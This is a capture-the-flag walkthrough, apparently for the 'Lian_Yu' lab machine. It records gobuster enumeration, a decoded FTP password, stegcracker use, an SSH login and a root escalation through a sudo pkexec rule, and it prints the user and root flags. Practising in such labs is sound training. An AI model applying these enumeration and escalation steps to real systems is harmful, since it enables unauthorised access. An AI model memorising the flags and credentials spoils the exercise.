/island/
I wasn't Expecting You at this Moment. I will meet you there

You should find a way to Lian_Yu as we are planed. The Code Word is:
vigilante

```
gobuster dir -u 10.10.131.104 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.131.104
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/23 21:26:29 Starting gobuster
===============================================================
/island (Status: 301)
/server-status (Status: 403)
Progress: 143798 / 220561 (65.20%)
```


```
gobuster dir -u 10.10.131.104/island/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.131.104/island/
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/23 22:19:16 Starting gobuster
===============================================================
/2100 (Status: 301)
```

```
gobuster dir -u 10.10.131.104/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x ticket

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.131.104/island/2100
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     ticket
[+] Timeout:        10s
===============================================================
2020/05/23 22:21:51 Starting gobuster
===============================================================
/green_arrow.ticket (Status: 200)
```

```
This is just a token to get into Queen's Gambit(Ship)


RTy8yhBQdscX -> !#th3h00d (base58 decode)

```

```
ftp 10.10.131.104

Connected to 10.10.131.104.
220 (vsFTPd 3.0.2)
Name (10.10.131.104:wuvel): vigilante
331 Please specify the password.
Password: !#th3h00d

```

```
.other_user:

Slade Wilson was 16 years old when he enlisted in the United States Army, having lied about his age. After serving a stint in Korea, he was later assigned to Camp Washington where he had been promoted to the rank of major. In the early 1960s, he met Captain Adeline Kane, who was tasked with training young soldiers in new fighting techniques in anticipation of brewing troubles taking place in Vietnam. Kane was amazed at how skilled Slade was and how quickly he adapted to modern conventions of warfare. She immediately fell in love with him and realized that he was without a doubt the most able-bodied combatant that she had ever encountered. She offered to privately train Slade in guerrilla warfare. In less than a year, Slade mastered every fighting form presented to him and was soon promoted to the rank of lieutenant colonel. Six months later, Adeline and he were married and she became pregnant with their first child. The war in Vietnam began to escalate and Slade was shipped overseas. In the war, his unit massacred a village, an event which sickened him. He was also rescued by SAS member Wintergreen, to whom he would later return the favor.

Chosen for a secret experiment, the Army imbued him with enhanced physical powers in an attempt to create metahuman super-soldiers for the U.S. military. Deathstroke became a mercenary soon after the experiment when he defied orders and rescued his friend Wintergreen, who had been sent on a suicide mission by a commanding officer with a grudge.[7] However, Slade kept this career secret from his family, even though his wife was an expert military combat instructor.

A criminal named the Jackal took his younger son Joseph Wilson hostage to force Slade to divulge the name of a client who had hired him as an assassin. Slade refused, claiming it was against his personal honor code. He attacked and killed the kidnappers at the rendezvous. Unfortunately, Joseph's throat was slashed by one of the criminals before Slade could prevent it, destroying Joseph's vocal cords and rendering him mute.

After taking Joseph to the hospital, Adeline was enraged at his endangerment of her son and tried to kill Slade by shooting him, but only managed to destroy his right eye. Afterwards, his confidence in his physical abilities was such that he made no secret of his impaired vision, marked by his mask which has a black, featureless half covering his lost right eye. Without his mask, Slade wears an eyepatch to cover his eye.
```

```
Donwload 3 foto

stegcracker aa.jpg 

dapet password. Buka file shado, dapet -> M3tahuman
```

```
ssh slade@........

slade@LianYu:~$ cat user.txt

THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
                        --Felicity Smoak
```

```
slade@LianYu:~$ find . Secret_Mission | grep "Secret_Mission"

./usr/src/Secret_Mission

slade@LianYu:~$ cat /usr/src/Secret_Mission

Why do we need Mirakuru? 


Enhancements to strength, senses, stamina and endurance in particular were raised beyond human capability, while reflexes and agility where raised only to the peak of human capability. Primarily, the serum resulted in the subject developing an accelerated healing factor that allowed them to recover completely from the most crippling, debilitating, and grievous of wounds, so long as any injuries were not immediately fatal or if an entire body part or organ were not lost; for example, the drug didn't keep Isabel Rochev from dying when her neck was snapped by Nyssa. Slade Wilson was also unable to regenerate his eye after it was pierced with an arrow, however this may be due to the arrow being left in his eye while the Mirakuru in his system became dormant.





super powers do you need just go find it.
```

```
slade@LianYu:~$ sudo -l

Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec


slade@LianYu:~$ sudo pkexec --user root cat /root/root.txt

                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
                                                                              --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825
```
